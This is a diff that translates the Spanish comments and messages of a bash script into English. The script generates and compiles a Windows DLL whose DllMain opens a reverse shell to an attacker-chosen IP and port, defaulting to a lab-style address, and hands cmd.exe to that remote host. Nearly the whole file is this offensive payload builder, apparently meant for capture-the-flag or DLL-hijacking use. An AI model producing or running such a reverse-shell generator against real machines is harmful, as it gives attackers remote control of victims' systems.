@@ -1,30 +1,30 @@
 #!/bin/bash
 
-# === CONFIGURACIÓN POR DEFECTO ===
+# === DEFAULT CONFIGURATION ===
 DEFAULT_IP="10.10.14.91"
 DEFAULT_PORT="5555"
 
-# Variables que pueden ser sobrescritas por argumentos
+# Variables that can be overridden by arguments
 IP="$DEFAULT_IP"
 PORT="$DEFAULT_PORT"
 
-# === USO ===
+# === USAGE ===
 usage() {
     echo "Usage: $0 [--ip <IP>] [--port <PORT>]"
-    echo "Ejemplo:"
-    echo "  $0                        # Usa IP y puerto por defecto"
-    echo "  $0 --ip 192.168.1.100     # Cambia solo IP"
-    echo "  $0 --port 4444            # Cambia solo puerto"
+    echo "Example:"
+    echo "  $0                        # Use default IP and port"
+    echo "  $0 --ip 192.168.1.100     # Change only IP"
+    echo "  $0 --port 4444            # Change only port"
     echo "  $0 --ip 192.168.1.100 --port 443"
     exit 1
 }
 
-# === PARSING DE ARGUMENTOS ===
+# === ARGUMENT PARSING ===
 while [[ $# -gt 0 ]]; do
     case "$1" in
         --ip)
             if [[ -z "$2" || "$2" =~ ^-- ]]; then
-                echo "[-] Error: --ip requiere un valor."
+                echo "[-] Error: --ip requires a value."
                 usage
             fi
             IP="$2"
@@ -32,44 +32,44 @@ while [[ $# -gt 0 ]]; do
             ;;
         --port)
             if [[ -z "$2" || "$2" =~ ^-- ]]; then
-                echo "[-] Error: --port requiere un valor."
+                echo "[-] Error: --port requires a value."
                 usage
             fi
             if ! [[ "$2" =~ ^[0-9]+$ ]] || [ "$2" -lt 1 ] || [ "$2" -gt 65535 ]; then
-                echo "[-] Puerto inválido: '$2'. Debe ser un número entre 1 y 65535."
+                echo "[-] Invalid port: '$2'. Must be a number between 1 and 65535."
                 exit 1
             fi
             PORT="$2"
             shift 2
             ;;
         *)
-            echo "Opción desconocida: $1"
+            echo "Unknown option: $1"
             usage
             ;;
     esac
 done
 
-# Validación mínima
+# Minimal validation
 if [[ -z "$IP" ]]; then
-    echo "[-] IP no puede estar vacía."
+    echo "[-] IP cannot be empty."
     exit 1
 fi
 
-# Validar formato básico de IP (opcional, mejora UX)
+# Validate basic IP format (optional, improves UX)
 if ! [[ "$IP" =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
-    echo "[-] Formato de IP inválido: $IP"
+    echo "[-] Invalid IP format: $IP"
     exit 1
 fi
 
-# === GENERAR module.c ===
+# === GENERATE module.c ===
 cat > module.c << EOF
-// module.c - Reverse Shell 100% API de Windows (sin CRT)
+// module.c - Reverse Shell 100% Windows API (no CRT)
 #include <windows.h>
 
 BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
     if (ul_reason_for_call != DLL_PROCESS_ATTACH) return TRUE;
 
-    // === Cargar Winsock manualmente ===
+    // === Load Winsock manually ===
     HMODULE hWinsock = LoadLibraryA("WS2_32.DLL");
     if (!hWinsock) return FALSE;
 
@@ -93,7 +93,7 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserv
         return FALSE;
     }
 
-    // === Inicializar Winsock ===
+    // === Initialize Winsock ===
     WSADATA wsa;
     if (WSAStartup(MAKEWORD(2,2), &wsa) != 0) {
         return FALSE;
@@ -116,13 +116,13 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserv
         return FALSE;
     }
 
-    // === Redirigir handles usando SetStdHandle ===
+    // === Redirect handles using SetStdHandle ===
     HANDLE hSocket = (HANDLE)s;
     SetStdHandle(STD_INPUT_HANDLE,  hSocket);
     SetStdHandle(STD_OUTPUT_HANDLE, hSocket);
     SetStdHandle(STD_ERROR_HANDLE,  hSocket);
 
-    // === Crear cmd.exe sin system() ===
+    // === Create cmd.exe without system() ===
     STARTUPINFO si = {0};
     PROCESS_INFORMATION pi = {0};
     si.cb = sizeof(si);
@@ -131,33 +131,33 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserv
     si.hStdOutput = hSocket;
     si.hStdError = hSocket;
 
-    // Usa una ruta completa para cmd.exe
+    // Use a full path for cmd.exe
     if (CreateProcessA("C:\\\\Windows\\\\System32\\\\cmd.exe", NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
         WaitForSingleObject(pi.hProcess, INFINITE);
         CloseHandle(pi.hProcess);
         CloseHandle(pi.hThread);
     }
 
-    // === Limpiar ===
+    // === Cleanup ===
     closesocket(s);
     WSACleanup();
     return TRUE;
 }
 EOF
 
-echo "[+] Archivo C generado: module.c"
+echo "[+] C file generated: module.c"
 
-# === COMPILAR COMO DLL ===
-echo "[*] Compilando module.dll..."
+# === COMPILE AS DLL ===
+echo "[*] Compiling module.dll..."
 
 x86_64-w64-mingw32-gcc module.c -o module.dll -shared -s \
   -nostdlib -nodefaultlibs -lkernel32 -lws2_32 \
   -e DllMain 2>/dev/null
 
 if [ $? -ne 0 ]; then
-    echo "[-] Error al compilar el código C."
+    echo "[-] Error compiling C code."
     exit 1
 fi
 
-echo "[+] Compilación exitosa: module.dll"
-echo "[*] IP: $IP | Puerto: $PORT"
+echo "[+] Compilation successful: module.dll"
+echo "[*] IP: $IP | Port: $PORT"
